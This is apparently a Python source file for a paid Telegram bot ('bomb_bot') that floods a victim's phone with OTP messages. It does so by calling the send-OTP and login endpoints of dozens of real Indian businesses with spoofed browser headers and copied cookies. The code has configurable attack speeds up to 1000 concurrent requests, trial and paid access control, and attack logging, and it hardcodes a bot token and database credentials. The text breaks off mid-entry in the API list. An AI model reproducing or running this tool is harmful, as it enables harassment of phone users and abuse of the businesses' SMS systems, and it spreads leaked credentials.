import asyncio
import aiohttp
import json
import re
import time
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import logging
from pathlib import Path
from typing import Optional
import html
import motor.motor_asyncio
from pymongo import MongoClient
import certifi
import os

# Bot configuration
BOT_TOKEN = "8692875544:AAEfME2sFMG-TqB11PhV-kknncF2JBTgKT0"

# MongoDB configuration
MONGODB_URI = "mongodb+srv://venommusic:venom112@cluster0.tvf0tqz.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
DATABASE_NAME = "bomb_bot"
COLLECTION_USERS = "authorized_users"
COLLECTION_LOGS = "attack_logs"
COLLECTION_SETTINGS = "user_settings"

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# =============== MONGODB CONNECTION ===============
class MongoDB:
    client: motor.motor_asyncio.AsyncIOMotorClient = None
    db = None
    
    @classmethod
    async def connect(cls):
        """Create MongoDB connection"""
        try:
            # Use certifi for SSL certificates
            cls.client = motor.motor_asyncio.AsyncIOMotorClient(
                MONGODB_URI,
                tlsCAFile=certifi.where(),
                serverSelectionTimeoutMS=5000
            )
            # Test connection
            await cls.client.admin.command('ping')
            cls.db = cls.client[DATABASE_NAME]
            
            # Create indexes for better performance
            await cls.db[COLLECTION_USERS].create_index("user_id", unique=True)
            await cls.db[COLLECTION_USERS].create_index("username")
            await cls.db[COLLECTION_LOGS].create_index("user_id")
            await cls.db[COLLECTION_LOGS].create_index("start_time")
            await cls.db[COLLECTION_SETTINGS].create_index("user_id", unique=True)
            
            print("✅ MongoDB Connected Successfully!")
            return True
        except Exception as e:
            print(f"❌ MongoDB Connection Failed: {e}")
            return False
    
    @classmethod
    async def close(cls):
        """Close MongoDB connection"""
        if cls.client:
            cls.client.close()
            print("🔌 MongoDB Connection Closed")

# Initialize MongoDB instance
mongo = MongoDB()

def clean_text(text: str) -> str:
    """Clean special characters and emojis from text"""
    if not text:
        return ""
    
    # Remove control characters and excessive special chars
    cleaned = re.sub(r'[\x00-\x1F\x7F-\x9F\u200B-\u200F\u2028-\u202F\u2060-\u206F]', '', text)
    # Keep only basic characters
    cleaned = re.sub(r'[^\w\s\-@\._#&]', '', cleaned, flags=re.UNICODE)
    return cleaned.strip()[:50]  # Limit length

async def add_authorized_user(user_id: int, username: str, display_name: str, added_by: int, is_paid: bool = False):
    """Add user to authorized list with cleaned text"""
    # Clean the inputs
    clean_username = clean_text(username)
    clean_display_name = clean_text(display_name)
    
    user_data = {
        "user_id": user_id,
        "username": clean_username,
        "display_name": clean_display_name,
        "added_at": datetime.now().isoformat(),
        "added_by": added_by,
        "trial_used_count": 0,
        "last_trial_used": None,
        "is_trial_blocked": False,
        "is_paid_user": is_paid
    }
    
    if is_paid:
        user_data["is_trial_blocked"] = True
    
    # Update if exists, insert if not
    await mongo.db[COLLECTION_USERS].update_one(
        {"user_id": user_id},
        {"$set": user_data},
        upsert=True
    )

async def remove_authorized_user(user_id: int):
    """Remove user from authorized list"""
    await mongo.db[COLLECTION_USERS].delete_one({"user_id": user_id})
    await mongo.db[COLLECTION_SETTINGS].delete_one({"user_id": user_id})

async def is_user_authorized(user_id: int) -> bool:
    """Check if user is authorized (paid user)"""
    user = await mongo.db[COLLECTION_USERS].find_one({"user_id": user_id})
    return user is not None and user.get("is_paid_user", False)

async def can_user_use_trial(user_id: int) -> tuple[bool, str]:
    """Check if user can use trial (once per week) - STRICT CHECK"""
    user = await mongo.db[COLLECTION_USERS].find_one({"user_id": user_id})
    
    # If user doesn't exist, they can use trial once
    if not user:
        return True, "First-time user, trial available"
    
    trial_used_count = user.get("trial_used_count", 0)
    is_trial_blocked = user.get("is_trial_blocked", False)
    is_paid_user = user.get("is_paid_user", False)
    
    # Check if user is paid user
    if is_paid_user:
        return False, "Paid users cannot use trial"
    
    # Check if trial is blocked
    if is_trial_blocked:
        return False, "Trial permanently blocked after first use"
    
    # If never used trial
    if trial_used_count == 0:
        return True, "First trial available"
    
    return False, "Trial already used"

async def mark_trial_used(user_id: int):
    """Mark trial as used for user - PERMANENTLY BLOCK after first use"""
    current_time = datetime.now().isoformat()
    
    await mongo.db[COLLECTION_USERS].update_one(
        {"user_id": user_id},
        {
            "$inc": {"trial_used_count": 1},
            "$set": {
                "last_trial_used": current_time,
                "is_trial_blocked": True
            }
        }
    )
    logger.info(f"Trial marked as used for user {user_id} - PERMANENTLY BLOCKED")

async def block_user_trial(user_id: int):
    """Permanently block trial for user"""
    await mongo.db[COLLECTION_USERS].update_one(
        {"user_id": user_id},
        {"$set": {"is_trial_blocked": True}}
    )
    logger.info(f"Trial blocked for user {user_id}")

async def unblock_user_trial(user_id: int):
    """Unblock trial for user"""
    await mongo.db[COLLECTION_USERS].update_one(
        {"user_id": user_id},
        {"$set": {"is_trial_blocked": False}}
    )
    logger.info(f"Trial unblocked for user {user_id}")

async def reset_user_trial(user_id: int):
    """Reset user's trial (admin only)"""
    await mongo.db[COLLECTION_USERS].update_one(
        {"user_id": user_id},
        {
            "$set": {
                "trial_used_count": 0,
                "last_trial_used": None,
                "is_trial_blocked": False
            }
        }
    )
    logger.info(f"Trial reset for user {user_id}")

async def get_user_trial_info(user_id: int) -> dict:
    """Get user's trial information"""
    user = await mongo.db[COLLECTION_USERS].find_one({"user_id": user_id})
    
    if not user:
        return {
            'trial_used_count': 0,
            'last_trial_used': None,
            'is_trial_blocked': False,
            'is_paid_user': False,
            'display_name': '',
            'trial_available': True,
            'exists': False
        }
    
    trial_used_count = user.get("trial_used_count", 0)
    last_trial_used = user.get("last_trial_used")
    is_trial_blocked = user.get("is_trial_blocked", False)
    is_paid_user = user.get("is_paid_user", False)
    display_name = user.get("display_name", "")
    
    # Check if trial is available
    trial_available = False
    if not is_trial_blocked and not is_paid_user:
        if trial_used_count == 0:
            trial_available = True
    
    return {
        'trial_used_count': trial_used_count,
        'last_trial_used': last_trial_used,
        'is_trial_blocked': is_trial_blocked,
        'is_paid_user': is_paid_user,
        'display_name': display_name,
        'trial_available': trial_available,
        'exists': True
    }

async def get_all_authorized_users():
    """Get all authorized users"""
    cursor = mongo.db[COLLECTION_USERS].find().sort("added_at", -1)
    users = await cursor.to_list(length=None)
    
    # Format for compatibility with existing code
    formatted_users = []
    for user in users:
        formatted_users.append((
            user.get("user_id"),
            user.get("username", ""),
            user.get("display_name", ""),
            user.get("added_at", ""),
            user.get("trial_used_count", 0),
            user.get("last_trial_used"),
            user.get("is_trial_blocked", False),
            user.get("is_paid_user", False)
        ))
    
    return formatted_users

async def get_user_speed_settings(user_id: int):
    """Get user's speed settings"""
    settings = await mongo.db[COLLECTION_SETTINGS].find_one({"user_id": user_id})
    
    if settings:
        return {
            'speed_level': settings.get('speed_level', 3),
            'max_concurrent': settings.get('max_concurrent', 10),
            'delay': settings.get('delay_between_requests', 0.1)
        }
    else:
        # Default settings
        default_settings = {
            'speed_level': 3,
            'max_concurrent': 10,
            'delay': 0.1
        }
        await set_user_speed_settings(user_id, default_settings)
        return default_settings

async def set_user_speed_settings(user_id: int, settings: dict):
    """Set user's speed settings"""
    settings_data = {
        "user_id": user_id,
        "speed_level": settings['speed_level'],
        "max_concurrent": settings['max_concurrent'],
        "delay_between_requests": settings['delay'],
        "updated_at": datetime.now().isoformat()
    }
    
    await mongo.db[COLLECTION_SETTINGS].update_one(
        {"user_id": user_id},
        {"$set": settings_data},
        upsert=True
    )

async def log_attack(user_id: int, target_number: str, duration: int, requests_sent: int, 
                     success: int, failed: int, start_time: datetime, end_time: datetime, 
                     status: str, is_trial_attack: bool = False):
    """Log attack details to database"""
    log_data = {
        "user_id": user_id,
        "target_number": target_number,
        "duration_seconds": duration,
        "requests_sent": requests_sent,
        "requests_success": success,
        "requests_failed": failed,
        "start_time": start_time.isoformat(),
        "end_time": end_time.isoformat(),
        "status": status,
        "is_trial_attack": is_trial_attack,
        "timestamp": datetime.now().isoformat()
    }
    
    await mongo.db[COLLECTION_LOGS].insert_one(log_data)

# Speed level presets (unchanged)
SPEED_PRESETS = {
    1: {  # Very Slow (Safe Mode)
        'name': '🐢 Very Slow',
        'max_concurrent': 30,
        'delay': 0.5,
        'description': 'Slowest speed, safest for testing',
        'emoji': '🐢'
    },
    2: {  # Slow
        'name': '🚶 Slow',
        'max_concurrent': 50,
        'delay': 0.3,
        'description': 'Slow speed, stable connections',
        'emoji': '🚶'
    },
    3: {  # Medium (Default)
        'name': '⚡ Medium',
        'max_concurrent': 100,
        'delay': 0.1,
        'description': 'Balanced speed and stability',
        'emoji': '⚡'
    },
    4: {  # Fast
        'name': '🚀 Fast',
        'max_concurrent': 200,
        'delay': 0.05,
        'description': 'Fast speed for quick attacks',
        'emoji': '🚀'
    },
    5: {  # Ultra Fast (VENOM Attack)
        'name': '⚡💥 VENOM MODE',
        'max_concurrent': 1000,
        'delay': 0.001,
        'description': 'VENOM ATTACK - Maximum speed, all APIs at once',
        'emoji': '⚡💥'
    }
}

# =============== ALL APIs START ===============
APIS = [
    # ============ ORIGINAL API ============
    {
        "url": "https://splexxo1-2api.vercel.app/bomb?phone={phone}&key=SPLEXXO",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 100
    },
    # ============ NEW APIS ============
    {
        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: json.dumps({"mobile_number": phone, "client_id": "kisan-app"}),
        "count": 10
    },
    
    {
        "url": "https://api.breeze.in/session/start",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "x-device-id": "A1pKVEDhlv66KLtoYsml3",
            "x-session-id": "MUUdODRfiL8xmwzhEpjN8"
        },
        "data": lambda phone: json.dumps({
            "phoneNumber": phone,
            "authVerificationType": "otp",
            "device": {
                "id": "A1pKVEDhlv66KLtoYsml3",
                "platform": "Chrome",
                "type": "Desktop"
            },
            "countryCode": "+91"
        }),
        "count": 10
    },
    
    {
        "url": "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=true",
        "method": "GET",
        "headers": {
            "accept": "*/*",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
            "origin": "https://www.jockey.in",
            "referer": "https://www.jockey.in/",
            "cookie": "localization=IN; _shopify_y=6556c530-8773-4176-99cf-f587f9f00905; _tracking_consent=3.AMPS_INUP_f_f_4MXMfRPtTkGLORLJPTGqOQ; _ga=GA1.1.377231092.1757430108; _fbp=fb.1.1757430108545.190427387735094641; _quinn-sessionid=a2465823-ceb3-4519-9f8d-2a25035dfccd; cart=hWN2mTp3BwfmsVi0WqKuawTs?key=bae7dea0fc1b412ac5fceacb96232a06; wishlist_id=7531056362789hypmaaup; wishlist_customer_id=0; _shopify_s=d4985de8-eb08-47a0-9f41-84adb52e6298"
        },
        "data": None,
        "count": 10
    },
    
    # ============ COUNT=5 (3).txt APIs ============
    {
        "url": "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://www.pw.live",
            "priority": "u=1, i",
            "randomid": "e66d7f5b-7963-408e-9892-839015a9c83f",
            "referer": "https://www.pw.live/",
            "sec-ch-ua": '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile": phone, "countryCode": "+91", "subOrgId": "SUB-PWLI000"}),
        "count": 5
    },
    
    {
        "url": "https://store.zoho.com/api/v1/partner/affiliate/sendotp?mobilenumber=91{phone}&countrycode=IN&country=india",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Length": "0",
            "Origin": "https://www.zoho.com",
            "Referer": "https://www.zoho.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": None,
        "count": 500
    },
    
    {
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3",
        "method": "POST",
        "headers": {
            "x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587",
            "x-app-version": "3.0.3",
            "x-user-journey-id": "7e4e8701-18c6-4ed7-b7f5-eb0a2ba2fbec",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/5.0.0-alpha.11"
        },
        "data": lambda phone: json.dumps({"phone_number": {"country_code": "+91", "number": phone}}),
        "count": 20
    },
    
    {
        "url": "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "shell#lang=en; ASP.NET_SessionId=nyoubocr2b4vz3iv2ahat3xs; ARRAffinity=433759ed76e330312e38a9f2e2e43b4a938d01a030cf5413c8faacb778ec580c; ARRAffinitySameSite=433759ed76e330312e38a9f2e2e43b4a938d01a030cf5413c8faacb778ec580c; _gcl_aw=GCL.1728839037.EAIaIQobChMIrY6l8umLiQMV5KhmAh1TaA0oEAMYASAAEgJ4pfD_BwE; _gcl_gs=2.1.k1$i1728839026$u150997757; _gcl_au=1.1.486755895.1728839037; _ga=GA1.1.694452391.1728839040; sts=eyJzaWQiOjE3Mjg4MzkwNDA3MjgsInR4IjoxNzI4ODM5MDQwNzI4LCJ1cmwiOiJodHRwcyUzQSUyRiUyRnVkeW9ncGx1cy5hZGl0eWFiaXJsYWNhcGl0YWwuY29tJTJGc2lnbnVwLWNvYnJhbmRlZCUzRnVybCUzRCUyRiUyNnV0bV9zb3VyY2UlM0REZW50c3Vnb29nbGUlMjZ1dG1fY2FtcGFpZ24lM0R0cmF2ZWxfcG1heCUyNnV0bV9tZWRpdW0lM0QlMjZ1dG1fY29udGVudCUzRGtscmFodWwlMjZqb3VybmV5JTNEcGwlMjZnYWRfc291cmNlJTNEMSUyNmdjbGlkJTNERUFJYUlRb2JDaE1Jclk2bDh1bUxpUU1WNUtobUFoMVRhQTBvRUFNWUFTQUFFZ0o0cGZEX0J3RSIsInBldCI6MTcyODgzOTA0MDcyOCwic2V0IjoxNzI4ODM5MDQwNzI4fQ==; stp=eyJ2aXNpdCI6Im5ldyIsInV1aWQiOiI5YTdmMGYyZC01NDJjLTRiNTEtYWEwNC01NzAwMjRlN2M4YjAifQ==; stgeo=IjAi; stbpnenable=MA==; __stdf=MA==; _ga_4CYZ07WNGN=GS1.1.1728839040.1.0.1728839049.51.0.0",
            "Origin": "https://udyogplus.adityabirlacapital.com",
            "Referer": "https://udyogplus.adityabirlacapital.com/signup-cobranded?url=/&utm_source=Dentsugoogle&utm_campaign=travel_pmax&utm_medium=&utm_content=klrahul&journey=pl&gad_source=1&gclid=EAIaIQobChMIrY6l8umLiQMV5KhmAh1TaA0oEAMYASAAEgJ4pfD_BwE",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: f"MobileNumber={phone}&functionality=signup",
        "count": 1
    },
    
    {
        "url": "https://www.muthootfinance.com/smsapi.php",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": "AWSALBAPP-0=_remove_; AWSALBAPP-1=_remove_; AWSALBAPP-2=_remove_; AWSALBAPP-3=_remove_; _gcl_au=1.1.289346829.1728838221; _ga_S5CNT4BSQC=GS1.1.1728838222.1.0.1728838222.60.0.0; _ga=GA1.2.273797446.1728838222; _gid=GA1.2.1628453949.1728838223; _gat_UA-38238796-1=1; _fbp=fb.1.1728838224699.885355239931807707; toasterClosedOnce=true",
            "origin": "https://www.muthootfinance.com",
            "priority": "u=1, i",
            "referer": "https://www.muthootfinance.com/personal-loan",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": lambda phone: f"mobile={phone}&pin=XjtYYEdhP0haXjo3",
        "count": 3
    },
    
    {
        "url": "https://api.gopaysense.com/users/otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "cookie": "_ga=GA1.2.1154421870.1728838134; _gid=GA1.2.883266871.1728838135; _gat_UA-96384581-2=1; WZRK_G=1acba64bbe41434abc9c3d3d5645deeb; WZRK_S_8RK-99W-485Z=%7B%22p%22%3A1%2C%22s%22%3A1728838134%2C%22t%22%3A1728838134%7D; _uetsid=0982d4e0898311ef9e26c943f5765261; _uetvid=09833b40898311efb6d4f32471c8cf05; _ga_4S93MBNNX8=GS1.2.1728838135.1.0.1728838140.55.0.0; _ga_F7R96SWGCB=GS1.1.1728838134.1.1.1728838140.0.0.0",
            "origin": "https://www.gopaysense.com",
            "priority": "u=1, i",
            "referer": "https://www.gopaysense.com/",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 5
    },
    
    {
        "url": "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1&_wrapper_format=drupal_ajax",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": "gclid=undefined; AKA_A2=A",
            "origin": "https://www.iifl.com",
            "priority": "u=1, i",
            "referer": "https://www.iifl.com/personal-loans",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": lambda phone: f"apply_for=18&full_name=Adnvs+Signh&mobile_number={phone}&terms_and_condition=1&utm_source=&utm_medium=&utm_campaign=&utm_content=&utm_term=&campaign=&gclid=&lead_id=&redirect_url=&form_build_id=form-FvvMqggkrdM-07pMIIyAElAcaj_kGjCMOS5UHKh_vUc&form_id=webform_submission_muti_step_lead_gen_form_node_66_add_form&_triggering_element_name=op&_triggering_element_value=Apply+Now&_drupal_ajax=1&ajax_page_state%5Btheme%5D=iifl_finance&ajax_page_state%5Btheme_token%5D=&ajax_page_state%5Blibraries%5D=bootstrap_barrio%2Fglobal-styling%2Cclientside_validation_jquery%2Fcv.jquery.ckeditor%2Cclientside_validation_jquery%2Fcv.jquery.ife%2Cclientside_validation_jquery%2Fcv.jquery.validate%2Cclientside_validation_jquery%2Fcv.pattern.method%2Ccore%2Fdrupal.autocomplete%2Ccore%2Fdrupal.collapse%2Ccore%2Fdrupal.states%2Ccore%2Finternal.jquery.form%2Ceu_cookie_compliance%2Feu_cookie_compliance_default%2Ciifl_crm_api%2Fglobal-styling%2Ciifl_crm_api%2Fgold-global-styling%2Ciifl_finance%2Fbootstrap%2Ciifl_finance%2Fbreadcrumb%2Ciifl_finance%2Fdailyhunt-pixel%2Ciifl_finance%2Fdatalayer%2Ciifl_finance%2Fglobal-styling%2Ciifl_finance%2Fpersonal-loan%2Ciifl_finance_common%2Fglobal%2Cnode_like_dislike_field%2Fnode_like_dislike_field%2Cparagraphs%2Fdrupal.paragraphs.unpublished%2Csearch_autocomplete%2Ftheme.minimal.css%2Csystem%2Fbase%2Cviews%2Fviews.module%2Cwebform%2Fwebform.ajax%2Cwebform%2Fwebform.composite%2Cwebform%2Fwebform.dialog%2Cwebform%2Fwebform.element.details%2Cwebform%2Fwebform.element.details.save%2Cwebform%2Fwebform.element.details.toggle%2Cwebform%2Fwebform.element.message%2Cwebform%2Fwebform.element.options%2Cwebform%2Fwebform.element.select%2Cwebform%2Fwebform.form",
        "count": 5
    },
    
    {
        "url": "https://v2-api.bankopen.co/users/register/otp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "baggage": "sentry-environment=prod,sentry-release=app-open-money%405.2.0,sentry-public_key=76093829eb3048de9926891ff8e44fac,sentry-trace_id=a17bb4c75de741ffa0998329abf41310",
            "content-type": "application/json",
            "origin": "https://app.opencapital.co.in",
            "priority": "u=1, i",
            "referer": "https://app.opencapital.co.in/en/onboarding/register?utm_source=google&utm_medium=cpc&utm_campaign=IYD_MaxTesting&utm_term=&utm_placement=&gad_source=1&gclid=EAIaIQobChMIo_vwi96LiQMVQaVmAh27cAhXEAAYAiAAEgIkAPD_BwE",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "sentry-trace": "a17bb4c75de741ffa0998329abf41310-bc065941fd22d33d-1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "x-api-version": "3.1",
            "x-client-type": "Web"
        },
        "data": lambda phone: json.dumps({"username": phone, "is_open_capital": 1}),
        "count": 5
    },
    
    {
        "url": "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://www.tatacapital.com",
            "priority": "u=0, i",
            "referer": "https://www.tatacapital.com/",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({
            "header": {
                "authToken": "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==",
                "identifier": "nli"
            },
            "body": {
                "mobileNumber": phone
            }
        }),
        "count": 40
    },
    
    {
        "url": "https://apis.tradeindia.com/app_login_api/login_app",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "client_remote_address": "10.0.2.16",
            "content-type": "application/json",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/4.11.0"
        },
        "data": lambda phone: json.dumps({"mobile": f"+91{phone}"}),
        "count": 3
    },
    
    {
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {
            "x-kb-app-name": "khatabook",
            "x-kb-app-version": "801800",
            "x-kb-app-locale": "en",
            "x-kb-platform": "android",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/4.10.0"
        },
        "data": lambda phone: json.dumps({"phone": phone, "country_code": "+91", "app_signature": "wk+avHrHZf2"}),
        "count": 20
    },
    
    {
        "url": "https://accounts.orangehealth.in/api/v1/user/otp/generate/",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.orangehealth.in",
            "priority": "u=1, i",
            "referer": "https://www.orangehealth.in/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile_number": phone, "customer_auto_fetch_message": True}),
        "count": 3
    },
    
    {
        "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "device-id": "e97edd71-16a3-4835-8aab-c67cf5e21be1",
            "language": "en",
            "origin": "https://www.jobhai.com",
            "priority": "u=1, i",
            "referer": "https://www.jobhai.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "source": "WEB",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-transaction-id": "JS-WEB-89b40679-56c2-4c0e-926e-0fafca8a84f3"
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 5
    },
    
    {
        "url": "https://mconnect.isteer.co/mconnect/login",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "app_platform": "mvaahna",
            "content-type": "application/json",
            "origin": "https://mvaahna.com",
            "priority": "u=1, i",
            "referer": "https://mvaahna.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile_number": f"+91{phone}"}),
        "count": 50
    },
    
    {
        "url": "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&jsonpcall=1&fromresend=0&operation_name=blank&_=1719472121119",
        "method": "GET",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "cookie": "_gid=GA1.2.1239008246.1719472125; _gat_gtag_UA_245702_1=1; _ga=GA1.1.1226959669.1719472122; _ga_1C0W65RV19=GS1.1.1719472121.1.1.1719472138.0.0.0; _ga_0VL2HF4X5B=GS1.1.1719472125.1.1.1719472138.47.0.0",
            "referer": "https://www.astrosage.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "script",
            "sec-fetch-mode": "no-cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": None,
        "count": 3
    },
    
    {
        "url": "https://api.spinny.com/api/c/user/otp-request/v3/",
